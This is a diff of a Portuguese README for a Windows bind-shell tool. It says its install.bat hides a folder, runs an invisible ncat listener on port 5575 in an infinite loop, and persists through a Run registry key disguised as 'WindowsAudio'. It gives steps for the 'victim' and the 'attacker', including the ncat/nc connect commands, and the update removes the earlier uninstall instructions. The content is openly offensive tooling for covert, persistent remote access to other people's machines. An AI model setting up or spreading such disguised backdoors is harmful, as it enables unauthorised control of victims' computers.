@@ -1,18 +1,29 @@
 # ncat_shell_win
-Ganhar acesso ao CMD do Windows via NCAT
+Ganhar acesso ao CMD do Windows via NCAT (Bind Shell)
 
-OBS: Precisa instalar o NMAP:
-https://nmap.org/dist/nmap-7.99-setup.exe
+## Requisitos
+- Instalar o Nmap (que inclui o ncat):
+  https://nmap.org/dist/nmap-7.99-setup.exe
 
-#AO CLICAR NO "install.bat"
-Ele cria pasta oculta	no C:\Users\Joao\WindowsAudio (atributo +h)
-Cria audio.vbs	Loop infinito com ncat invisível na porta 4444
-Cria audio.bat	Executa o .vbs e fecha
-O Registro Inicia junto com Windows como "WindowsAudio"
-Já sobe o listener na hora
+## O que o install.bat faz
+| Ação         | Descrição |
+|--------------|-----------|
+| Pasta oculta | Cria `C:\Users\Usuario\WindowsAudio\` (atributo +h) |
+| audio.vbs    | Loop infinito com ncat invisível na porta **5575** |
+| audio.bat    | Executa o .vbs e fecha |
+| Registro     | Inicia junto com Windows (nome: `WindowsAudio`) |
+| Listener     | Já sobe na hora |
 
-#Para confirmar que ficou só o Registro:
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio"
+## Como usar
 
-#Para remover do Registro:
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /f
+### 1. Na vítima (Windows)
+Execute o `install.bat`
+
+### 2. No atacante
+```bash
+# Windows (via ncat)
+ncat IP_DA_VITIMA 5575
+
+# Linux (via nc ou ncat)
+nc IP_DA_VITIMA 5575
+ncat IP_DA_VITIMA 5575
